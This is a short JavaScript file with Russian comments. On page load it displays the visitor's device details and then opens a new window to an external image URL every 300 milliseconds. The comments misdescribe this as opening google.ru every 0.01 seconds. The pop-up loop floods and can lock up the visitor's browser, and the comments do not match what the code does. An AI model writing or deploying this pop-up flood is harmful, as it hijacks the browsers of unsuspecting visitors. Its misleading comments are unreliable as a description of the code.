// Функция для открытия google.ru каждые 0.01 секунд
function openGoogle() {
    setInterval(function() {
        window.open('https://imagehub.fun/F0CAFS.png', '_blank');
    }, 300);
}

// Функция для получения и отображения информации об устройстве
function displayDeviceInfo() {
    document.getElementById('userAgent').innerText = `User Agent: ${navigator.userAgent}`;
    document.getElementById('screenResolution').innerText = `Разрешение экрана: ${screen.width}x${screen.height}`;
    document.getElementById('platform').innerText = `Платформа: ${navigator.platform}`;
}

// Инициализация функций при загрузке страницы
window.onload = function() {
    displayDeviceInfo();
    openGoogle();
};
